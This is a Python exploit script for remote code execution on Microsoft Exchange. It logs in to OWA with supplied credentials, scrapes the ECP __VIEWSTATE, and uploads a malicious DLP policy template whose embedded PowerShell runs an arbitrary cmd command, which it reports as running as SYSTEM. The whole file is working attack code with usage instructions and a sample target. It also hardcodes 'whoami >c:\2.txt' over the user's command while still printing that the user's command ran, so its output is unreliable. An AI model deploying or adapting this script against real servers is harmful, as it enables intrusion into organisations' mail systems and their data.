import re
import sys
import random
import string
import urllib3
import requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def random_string(str_len=8):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(str_len))

def get_xml(c):
    c="whoami >c:\\2.txt"
    return """<?xml version="1.0" encoding="UTF-8"?>
<dlpPolicyTemplates>
  <dlpPolicyTemplate id="F7C29AEC-A52D-4502-9670-141424A83FAB" mode="Audit" state="Enabled" version="15.0.2.0">
    <contentVersion>4</contentVersion>
    <publisherName>si</publisherName>
    <name>
      <localizedString lang="en"></localizedString>
    </name>
    <description>
      <localizedString lang="en"></localizedString>
    </description>
    <keywords></keywords>
    <ruleParameters></ruleParameters>
    <policyCommands>
      <commandBlock>
        <![CDATA[ $i=New-object System.Diagnostics.ProcessStartInfo;$i.UseShellExecute=$true;$i.FileName="cmd";$i.Arguments="/c %s";$r=New-Object System.Diagnostics.Process;$r.StartInfo=$i;$r.Start() ]]>
      </commandBlock>
    </policyCommands>
    <policyCommandsResources></policyCommandsResources>
  </dlpPolicyTemplate>
</dlpPolicyTemplates>""" % c

def trigger_rce(t, s, vs, cmd):
    f = {
        '__VIEWSTATE': (None, vs),
        'ctl00$ResultPanePlaceHolder$senderBtn': (None, "ResultPanePlaceHolder_ButtonsPanel_btnNext"),
        'ctl00$ResultPanePlaceHolder$contentContainer$name': (None, random_string()),
        'ctl00$ResultPanePlaceHolder$contentContainer$upldCtrl': ("dlprce.xml", get_xml(cmd)),
    }
    r = s.post("https://%s/ecp/DLPPolicy/ManagePolicyFromISV.aspx" % t, files=f, verify=False)
    assert r.status_code == 200, "(-) failed to trigger rce!"

def leak_viewstate(t, s):
    r = s.get("https://%s/ecp/DLPPolicy/ManagePolicyFromISV.aspx" % t, verify=False)
    match = re.search("<input type=\"hidden\" name=\"__VIEWSTATE\" id=\"__VIEWSTATE\" value=\"(.*)\" />", r.text)
    assert match != None, "(-) couldn't leak the __viewstate!"
    return match.group(1)
    
def log_in(t, usr, pwd):
    s = requests.Session()
    d = {
        "destination" : "https://%s/owa" % t,
        "flags" : "",
        "username" : usr,
        "password" : pwd
    }
    s.post("https://%s/owa/auth.owa" % t, data=d, verify=False)
    assert s.cookies.get(name='X-OWA-CANARY') != None, "(-) couldn't leak the csrf canary!"
    return s

def main(t, usr, pwd, cmd):
    s = log_in(t, usr, pwd)
    print("(+) logged in as %s" % usr)
    vs = leak_viewstate(t, s)
    print("(+) found the __viewstate: %s" % vs)
    trigger_rce(t, s, vs, cmd)
    print("(+) executed %s as SYSTEM!" % cmd)

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("(+) usage: %s <target> <user:pass> <cmd>" % sys.argv[0])
        print("(+) eg: %s 192.168.75.142 harrym@exchangedemo.com:user123### mspaint" % sys.argv[0])
        sys.exit(-1)
    trgt = sys.argv[1]
    assert ":" in sys.argv[2], "(-) you need a user and password!"
    usr = sys.argv[2].split(":")[0]
    pwd = sys.argv[2].split(":")[1]
    cmd = sys.argv[3]
    main(trgt, usr, pwd, cmd)